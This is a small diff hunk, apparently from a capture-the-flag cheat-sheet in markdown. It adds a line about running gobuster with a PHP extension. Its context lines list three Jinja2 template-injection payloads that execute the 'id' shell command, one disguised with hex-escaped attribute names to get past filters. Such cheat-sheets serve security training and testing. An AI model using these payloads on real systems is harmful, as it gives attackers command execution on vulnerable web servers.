@@ -71,6 +71,7 @@
   - `{{''.__class__.mro()[1].__subclasses__()[132].__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`
   - `{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5f\x6d\x72\x6f\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('id')|attr('read')()}}`
   - `{{ ''.__class__.__mro__[1].__subclasses__()[408]("id", shell=True, stdout=-1).communicate() }}`
+  - Run gobuster with php extension
 
 
 ## Forensics
